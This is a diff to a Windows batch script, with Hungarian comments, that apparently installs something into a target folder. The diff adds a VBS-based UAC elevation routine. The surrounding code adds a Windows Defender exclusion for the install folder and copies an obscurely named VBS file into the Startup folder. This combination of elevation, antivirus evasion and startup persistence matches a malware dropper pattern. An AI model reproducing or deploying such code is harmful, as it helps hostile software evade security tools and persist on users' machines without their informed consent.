@@ -12,6 +12,12 @@ if not exist "%TARGET%" (
     mkdir "%TARGET%"
 )
 
+:ker_admin
+    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
+    echo UAC.ShellExecute "%~s0", "", "", "runas", 1 >> "%temp%\getadmin.vbs"
+    cscript //B "%temp%\getadmin.vbs"
+    exit
+
 
 :admin_folytatas
     POWERSHELL -InputFormat None -OutputFormat None -NonInteractive -Command "Add-MpPreference -ExclusionPath '%TARGET%'"
@@ -98,8 +104,8 @@ if not exist "%STARTUP_FOLDER%" (
 )
 
 :: .py fájlok bemásolása Startupba
-copy "%~dp0sifustartup5sfgj.vbs" "%STARTUP_FOLDER%\sifustartup5sfgj.vbs.vbs" /Y >nul
+copy "%~dp0sifustartup5sfgj.vbs" "%STARTUP_FOLDER%\sifustartup5sfgj.vbs" /Y >nul
 
 echo Kész.
-pause
 
+pause
